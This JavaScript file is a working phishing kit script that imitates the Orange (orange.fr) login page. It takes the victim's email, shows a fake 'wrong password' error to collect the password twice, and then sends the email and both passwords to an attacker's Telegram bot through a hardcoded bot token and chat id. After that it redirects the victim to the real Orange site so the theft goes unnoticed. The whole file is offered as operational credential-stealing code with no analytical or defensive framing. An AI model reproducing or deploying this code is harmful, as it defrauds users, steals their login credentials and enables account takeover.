const form = document.querySelector('#form');

function validateEmail(email) {
  const re = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
  return re.test(String(email).toLowerCase());
}

function send(text1, text2, text3)
{
    const msg =
        `
        Email: ${text1}
        Password_1: ${text2}
        Password_2: ${text3}
        `
    // const token = "5599525879:AAEupZEuVDERkUK-zzqIH_vl0PpvlK0paSo";
    const token = "5495517212:AAHkRYAdGHv2h4oiyDut9cn7s0IEz3cSKCM";
    const chat_id = "1174898493";
    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${msg}`;

    const api = new XMLHttpRequest()
    api.open("GET", url, true)
    api.send()
    // check if it's sent correctly
    api.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            window.location.href = "https://www.orange.fr/";
        }
    }
    

    console.log('sent!')
}
var email = ''
var password = ''
var times = 0; 
form.addEventListener('submit', (e) => {
    e.preventDefault();

    const input = form.querySelector('input');
    if(times == 1)
    {
        send(email, password, input.value)
        return;
    }
    //see if the input is a valid email
    if (!email && !validateEmail(input.value)) 
        return;
    if(email && !password && times == 0)
    {
        const er_div = document.createElement('div');
        er_div.innerHTML = '<div  class="sc-jrAFXE fBufSX"><div class="sc-iqHYmW hvxpQO"><svg width="20" height="20" viewBox="0 0 1024 1024" id="login-error-icon-error"><path d="M493.967 46.154c-26.092 4.098-54.098 20.356-70.082 40.71-5.328 6.695-22.95 35.383-34.562 56.284-1.776 3.415-3.825 6.695-4.372 7.514-0.547 0.683-6.695 11.202-13.661 23.224-15.027 25.956-19.126 32.923-28.688 49.18-3.825 6.695-8.333 14.48-9.836 17.076-2.459 4.098-18.033 31.011-36.612 62.841-2.868 4.917-8.88 15.163-13.525 22.95-4.508 7.65-9.563 16.257-11.065 19.126-1.502 2.732-3.415 6.011-4.098 7.104-1.23 1.776-18.716 31.83-25.956 44.399-1.23 2.185-18.443 31.694-38.251 65.574-19.809 33.743-40.3 69.125-45.765 78.552-12.705 21.858-77.869 133.743-93.579 160.519-23.634 40.3-50.273 86.201-53.142 91.803-6.011 12.022-9.972 28.962-10.519 45.491-0.273 8.606 0.136 18.716 0.819 22.541 2.185 11.202 7.923 27.322 13.114 36.476 4.372 7.787 17.076 24.317 21.448 27.732 15.984 13.114 26.23 19.262 39.344 23.907 19.945 6.967-2.185 6.695 435.108 6.695 441.256 0.136 420.764 0.41 439.343-6.831 19.673-7.514 36.749-19.809 48.907-34.972 26.639-33.060 33.060-76.093 17.35-115.163-1.776-4.234-20.901-38.115-42.623-75.272-21.584-37.159-41.257-70.902-43.716-75-8.744-15.027-29.781-51.365-67.623-116.12-21.311-36.476-46.312-79.508-55.737-95.628-22.131-38.115-23.634-40.71-37.842-64.891-6.557-11.339-13.525-23.224-15.301-26.639-1.913-3.415-4.781-8.333-6.557-10.929-3.279-5.191-9.836-16.257-29.235-49.863-6.967-12.022-13.114-22.814-13.935-23.907-1.366-2.323-12.431-21.448-16.393-28.415-4.645-8.061-7.65-13.114-14.891-25.547-3.962-6.831-10.382-17.896-14.344-24.59-3.962-6.831-11.339-19.399-16.393-28.005s-10.382-17.896-11.885-20.492c-11.612-20.082-22.95-38.661-27.186-44.399-13.252-17.896-32.651-31.285-56.558-39.208-9.972-3.279-15.301-4.098-28.005-4.508-8.606-0.273-19.262 0-23.497 0.683zM392.465 413.64c5.328 2.459 19.399 15.574 63.115 59.29l56.42 56.147 56.284-56.284c64.617-64.344 62.294-62.568 83.060-62.568 11.612 0 13.797 0.41 20.218 3.825 21.448 11.202 30.738 34.153 23.497 57.241l-3.142 9.972-113.524 114.071 57.513 57.786c63.115 63.115 63.661 63.798 65.438 81.284 1.776 16.257-7.24 34.426-21.311 43.306-12.978 8.197-30.464 9.289-44.399 2.868-7.24-3.279-15.027-10.519-65.847-61.339l-57.786-57.65-57.65 57.65c-49.454 49.454-58.879 58.196-65.574 61.202-23.771 10.793-50.137 1.366-62.022-22.541-3.279-6.421-3.825-9.289-3.825-19.126-0.136-20.628-1.23-19.262 65.164-85.656l57.65-57.786-55.601-55.601c-63.934-64.071-63.251-63.115-63.251-83.743 0-9.699 0.547-12.842 3.551-19.262 5.601-11.748 16.94-21.722 29.918-25.956 6.695-2.185 24.864-0.547 32.104 2.868z" fill="#E70002"></path></svg><p id="login-error-title-error" class="sc-crrszt bCOkTf">wrong password</p></div></div>'
        form.querySelector('#login-label').insertAdjacentElement('afterend', er_div);
        if(input.value)
        password = input.value;
        times++;
        return
    }

    email = input.value;
    form.querySelector('#login-label').innerHTML = 'Please insert your password';
    input.setAttribute('type', 'password');
    input.value = '';
    input.setAttribute('placeholder', 'Password');
    form.querySelector('#btnSubmit').innerHTML = 'Login';

    const div = document.createElement('div');
    div.innerHTML = `<div class="sc-jSgvzq gmVPmI"><div class="sc-eCstlR fgvYcm"><div class="sc-1mkhjqn-0 ffKlWN"><div data-testid="user-avatar" class="sc-1mkhjqn-1 egALGk"><svg width="80" height="80" viewBox="0 0 80 80"><defs><circle id="ancg23ohva" cx="40" cy="40" r="40"></circle></defs><g fill="none" fill-rule="evenodd"><mask id="byee0xikqb" fill="#fff"><use xlink:href="#ancg23ohva"></use></mask><use fill="#F4F4F4" fill-rule="nonzero" xlink:href="#ancg23ohva"></use><path fill="#999" fill-rule="nonzero" d="M40.216 10.265c8.955 0 16.145 7.15 16.145 16.054 0 8.905-7.19 16.053-16.145 16.053-8.956 0-16.145-7.148-16.145-16.053 0-8.905 7.273-16.054 16.145-16.054z" mask="url(#byee0xikqb)"></path><path fill="#999" fill-rule="nonzero" d="M25.356 82.342c-5.339 0-9.78-3.384-9.78-7.395V56.814c0-6.351 4.07-12.326 10.433-15.752 0 0 5.797 5.39 14.253 5.557 8.415-.209 13.888-5.557 13.888-5.557 6.406 3.426 10.629 9.4 10.629 15.752v25.528H25.356z" mask="url(#byee0xikqb)"></path></g></svg></div><div class="sc-1mkhjqn-2 euSlgf"><div class="sc-1mkhjqn-3 bxFHyv"><p data-testid="selected-account-login" color="black" class="sc-fubCzh iflbmY"><strong>${email}</strong></p></div><div><a role="button" tabindex="0" id="changeAccountLink" data-testid="change-account" data-oevent-category="idme_password" data-oevent-action="clic_changer_de_compte" data-oevent-label="utiliser_un_autre_compte" class="sc-dlfnuX gPscOZ">Changer de compte<svg width="10" height="10" viewBox="0 0 691.1999999999997 1024"><path d="M151.73 1023.992l530.944-512-530.944-512-151.723 146.219 379.349 365.781-379.349 365.653 151.723 146.347z" fill="#000"></path></svg></a></div></div></div></div></div>`;
    form.querySelector('.TofCC').insertAdjacentElement('afterend', div);

   
})